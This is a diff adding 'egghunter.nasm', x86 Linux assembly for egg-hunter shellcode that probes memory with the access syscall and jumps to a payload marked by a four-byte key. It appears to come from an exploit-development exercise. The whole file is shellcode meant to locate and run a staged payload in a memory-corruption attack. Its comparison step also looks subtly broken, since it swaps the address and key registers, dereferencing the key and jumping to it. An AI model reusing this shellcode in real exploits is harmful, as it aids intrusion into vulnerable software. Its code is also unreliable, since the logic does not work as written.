@@ -1,0 +1,43 @@
+; Filename: egghunter.nasm
+; Author:   Jake
+; Website:  http://github.com/14deep
+; Purpose:  Egg Hunter shellcode using the access(2) syscall
+
+
+global _start			
+
+section .text
+_start:
+
+init:
+	xor ebx, ebx ; ebx nulled
+	mul ebx      ; eax nulled
+	mov edx, 0x50905091 ; key to find + 1
+	dec edx      ; dec edx to = the key
+
+addr_inc:
+	inc ebx      ;ebx will contain the memory location to be checked
+	pusha
+
+syscall:
+	mov al, 0x21
+	int 0x80
+
+cmp1:
+	cmp al, 0xf2
+	popa
+	jz short addr_inc
+
+cmp2:
+	cmp [edx], ebx
+	jnz short addr_inc
+
+	cmp [edx+0x4], ebx
+	jnz short addr_inc
+
+confirmed:
+	jmp edx
+
+
+
+
